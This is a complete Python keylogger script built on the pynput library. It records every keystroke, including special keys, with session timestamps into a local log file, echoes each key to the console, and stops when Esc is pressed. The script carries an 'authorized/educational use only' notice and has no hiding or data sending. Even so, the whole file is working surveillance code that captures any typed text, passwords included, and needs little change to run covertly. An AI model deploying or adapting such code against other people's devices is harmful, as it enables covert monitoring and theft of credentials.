from pynput import keyboard
from datetime import datetime

LOG_FILE = "keystroke_log.txt"

# Ethical notice
print("⚠️  Keylogger running. For authorized/educational use only. Press Esc to stop.")

with open(LOG_FILE, 'a') as f:
    f.write(f"\n--- Session Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")

def on_press(key):
    """Callback when key is pressed."""
    try:
        print(f'Key pressed: {key.char}')
        with open(LOG_FILE, 'a') as f:
            f.write(key.char)
    except AttributeError:
        print(f'Special key pressed: {key}')
        if key == keyboard.Key.space:
            log_char = ' '
        elif key == keyboard.Key.enter:
            log_char = '\n'
        elif key == keyboard.Key.backspace:
            log_char = '[backspace]'
        else:
            log_char = str(key)

        with open(LOG_FILE, 'a') as f:
            f.write(log_char)

def on_release(key):
    """Callback when key is released."""
    if key == keyboard.Key.esc:
        with open(LOG_FILE, 'a') as f:
            f.write(f"\n--- Session Ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
        print("Keylogger stopped.")
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
